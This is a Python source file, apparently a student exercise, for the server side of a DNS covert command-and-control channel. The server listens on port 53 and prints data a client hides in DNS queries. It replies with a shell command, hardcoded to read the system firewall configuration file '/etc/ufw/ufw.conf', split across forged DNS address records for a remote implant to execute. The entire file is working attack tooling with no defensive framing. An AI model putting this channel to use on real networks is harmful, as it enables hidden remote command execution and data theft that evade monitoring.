'''
Author       : y0ung
E-mail       : abandonedpeter@outlook.com
Date         : 2023-04-03 22:27:27
LastEditTime : 2023-04-10 12:54:07
FilePath     : \task1\DNSServer.py
Description  : 
Copyright (c) 2023 by WHU-y0ung, All Rights Reserved. 
'''

import socket
import time

def MakeRespPack(query_pack: bytes, cmd: str):
	query_pack = bytearray(query_pack)
	query_pack[2] = 0x80
	if len(cmd) % 4 != 0:
		query_pack[7] = len(cmd) // 4 + 1
	else:
		query_pack[7] = len(cmd) // 4
	msg = bytes(query_pack)

	CmdList = []
	for i in range(0, len(cmd), 4):
		subcmd = cmd[i:i+4]
		CmdList.append(subcmd)
	
	for i in range(0, len(CmdList)):
		Name = 0xc00c
		Type = 0x0001
		Class = 0x0001
		TTL = 0x00000100
		DataLen = 0x0004
		Addr = CmdList[i]

		Name = Name.to_bytes(2, 'big')
		Type = Type.to_bytes(2, 'big')
		Class = Class.to_bytes(2, 'big')
		TTL = TTL.to_bytes(4, 'big')
		DataLen = DataLen.to_bytes(2, 'big')
		Addr = Addr.encode('utf-8')
		while len(Addr) < 4:
			Addr += b'\x00'
		
		msg = msg + Name + Type + Class + TTL + DataLen + Addr

	return msg

if __name__ == '__main__':
	command = "cat /etc/ufw/ufw.conf"

	server_host = socket.gethostname()
	server_port = 53

	server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	# Use bind() To Server's Port, Retry For 3 Times
	retry_cnt = 0
	retry_max = 3
	while True:
		try:
			server_sock.bind((server_host, server_port))
			break
		except Exception as e:
			print("Exception occurred:", e)
			retry_cnt += 1
			if retry_cnt >= retry_max:
				raise e
			else:
				print("Retrying...")
				time.sleep(3)

	# For Convenience, Server Only Receive Once. You Can Also Use 'while' Below
	# while True:
	try:
		client_data, client_addr = server_sock.recvfrom(1024)

		if client_data:
			# print(client_data, "\nFrom client IP", client_addr[0], "port:", client_addr[1])

			# Read Client's Result
			cdata_arr = bytearray(client_data)
			res = cdata_arr[12:-4].decode('utf-8')
			print(res)

			resp_pack = MakeRespPack(client_data, command)

			server_sent = server_sock.sendto(resp_pack, client_addr)

	finally:
		server_sock.close()